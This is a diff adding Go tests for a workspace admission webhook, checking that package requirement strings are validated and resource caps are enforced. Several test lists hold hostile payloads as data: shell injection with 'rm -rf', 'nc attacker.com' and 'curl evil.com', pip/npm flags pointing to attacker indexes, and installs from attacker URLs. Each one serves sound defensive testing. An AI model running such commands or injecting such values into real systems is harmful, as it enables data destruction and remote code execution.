@@ -452,3 +452,214 @@ func TestG2Workspace_AllowlistPrefixWithoutSlashIsNormalized(t *testing.T) {
 			"slash-normalised prefix must reject suffix attack")
 	})
 }
+
+// =============================================================================
+// G4 (F1.2.5) — Spec.Packages[].Requirements[] shell-injection guard
+// =============================================================================
+//
+// Pre-fix the controller built `pip install --target=... <req>` by
+// string concatenation, so a requirement like "pkg; rm -rf /" got
+// shell execution in the init container. The webhook is the primary
+// admission control; the controller-side shell-quoting (in
+// buildWorkspaceSetupScript) is defense-in-depth.
+
+func TestG4_F125_RejectsShellInjectionInRequirements(t *testing.T) {
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+	}
+	for _, payload := range []string{
+		"requests; rm -rf /workspace",
+		"requests | nc attacker.com 9999",
+		"requests && curl evil.com",
+		"requests`whoami`",
+		"requests$(whoami)",
+		"requests > /etc/passwd",
+		"requests\nrm -rf /",
+		"requests\trm -rf /",
+		"requests\\malicious",
+		"requests'malicious",
+		"requests\"malicious",
+		"requests with spaces",
+		"requests\x00null",
+		"../../../etc/passwd",
+	} {
+		t.Run(payload, func(t *testing.T) {
+			ws := minimalValidWorkspace()
+			ws.Spec.Packages = []v1.WorkspacePackageSet{
+				{Runtime: "python:3.11", Requirements: []string{payload}},
+			}
+			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+			assert.False(t, resp.Allowed,
+				"adversarial requirement %q must be rejected", payload)
+		})
+	}
+}
+
+func TestG4_F125_AllowsLegitimateRequirements(t *testing.T) {
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+	}
+	for _, req := range []string{
+		"requests",
+		"requests==2.31.0",
+		"requests>=2.0,<3.0",
+		"requests~=2.31",
+		"requests[security]==2.31.0",
+		"@scope/package",
+		"@scope/package@1.2.3",
+		"github.com/spf13/cobra",
+		"github.com/spf13/cobra@v1.8.0",
+		"torch==2.1.0+cu118",
+		"package_underscore",
+		"package-with-dash",
+		"a.b.c",
+	} {
+		t.Run(req, func(t *testing.T) {
+			ws := minimalValidWorkspace()
+			ws.Spec.Packages = []v1.WorkspacePackageSet{
+				{Runtime: "python:3.11", Requirements: []string{req}},
+			}
+			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+			assert.True(t, resp.Allowed,
+				"legitimate requirement %q must pass: %v", req, resp.Result)
+		})
+	}
+}
+
+func TestG4_F125_RejectsEmptyAndOverlongRequirements(t *testing.T) {
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+	}
+	for name, payload := range map[string]string{
+		"empty":      "",
+		"all-spaces": "   ",
+		"overlong":   strings.Repeat("a", 257),
+	} {
+		t.Run(name, func(t *testing.T) {
+			ws := minimalValidWorkspace()
+			ws.Spec.Packages = []v1.WorkspacePackageSet{
+				{Runtime: "python:3.11", Requirements: []string{payload}},
+			}
+			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+			assert.False(t, resp.Allowed)
+		})
+	}
+}
+
+// =============================================================================
+// G4 — additional bypass classes from validator pass 2 (worklog 0098)
+// =============================================================================
+
+func TestG4_F125_RejectsArgvInjectionFlags(t *testing.T) {
+	// Validator-found bypass class: requirements that pass the
+	// shell-metachar regex but contain pip/npm/go-install flags
+	// that redirect the package manager to attacker resources (RCE).
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+	}
+	for _, payload := range []string{
+		"--index-url=http://attacker.com/pypi",
+		"--extra-index-url=http://attacker",
+		"-r/etc/passwd",
+		"-rrequirements.txt",
+		"--target=/etc",
+		"--registry=http://attacker.com",
+		"-toolexec=/usr/bin/curl",
+		"-",  // bare dash
+		"--", // bare double dash
+	} {
+		t.Run(payload, func(t *testing.T) {
+			ws := minimalValidWorkspace()
+			ws.Spec.Packages = []v1.WorkspacePackageSet{
+				{Runtime: "python:3.11", Requirements: []string{payload}},
+			}
+			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+			assert.False(t, resp.Allowed,
+				"argv-injection payload %q must be rejected (F1.2.5 validator pass 2)", payload)
+		})
+	}
+}
+
+func TestG4_F125_RejectsURLAndPathRequirements(t *testing.T) {
+	// Validator-found bypass class: VCS / URL / file-path installs
+	// give pip / npm direct RCE via attacker setup.py / preinstall.
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+	}
+	for _, payload := range []string{
+		"git+https://attacker.com/repo.git",
+		"git+https://attacker.com/repo.git@v1.0",
+		"git+ssh://attacker.com/repo.git",
+		"https://attacker.com/evil.tar.gz",
+		"http://attacker.com/evil.whl",
+		"ftp://attacker.com/x",
+		"file:///etc/passwd",
+		"file://./pkg.tar.gz",
+		"./relative-path",
+		"../parent-path",
+		"/absolute/path",
+		"svn+https://attacker/r",
+		"hg+https://attacker/r",
+	} {
+		t.Run(payload, func(t *testing.T) {
+			ws := minimalValidWorkspace()
+			ws.Spec.Packages = []v1.WorkspacePackageSet{
+				{Runtime: "python:3.11", Requirements: []string{payload}},
+			}
+			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+			assert.False(t, resp.Allowed,
+				"URL/path payload %q must be rejected (F1.2.5 validator pass 2)", payload)
+		})
+	}
+}
+
+func TestG4_F123_WebhookCapsCPUMemoryAndEphemeral(t *testing.T) {
+	// Validator-found surface: spec.resources.* could declare
+	// 999999999m and stay Pending forever. Webhook caps prevent it.
+	v := &WorkspaceValidator{
+		Decoder:                admission.NewDecoder(newScheme(t)),
+		AllowedImageRegistries: []string{"ghcr.io/"},
+		MaxStorageGi:           1024,
+		MaxCPUMillicores:       16000,
+		MaxMemoryMi:            65536,
+		MaxEphemeralStorageGi:  100,
+	}
+	t.Run("cpu over cap", func(t *testing.T) {
+		ws := minimalValidWorkspace()
+		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "20000m"}
+		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+		assert.False(t, resp.Allowed)
+	})
+	t.Run("memory over cap", func(t *testing.T) {
+		ws := minimalValidWorkspace()
+		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "100Gi"}
+		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+		assert.False(t, resp.Allowed)
+	})
+	t.Run("ephemeral over cap", func(t *testing.T) {
+		ws := minimalValidWorkspace()
+		ws.Spec.Resources = &v1.ResourceRequirements{EphemeralStorage: "200Gi"}
+		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+		assert.False(t, resp.Allowed)
+	})
+	t.Run("at cap is allowed", func(t *testing.T) {
+		ws := minimalValidWorkspace()
+		ws.Spec.Resources = &v1.ResourceRequirements{
+			CPU:              "16000m",
+			Memory:           "65536Mi",
+			EphemeralStorage: "100Gi",
+		}
+		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
+		assert.True(t, resp.Allowed, "%v", resp.Result)
+	})
+}
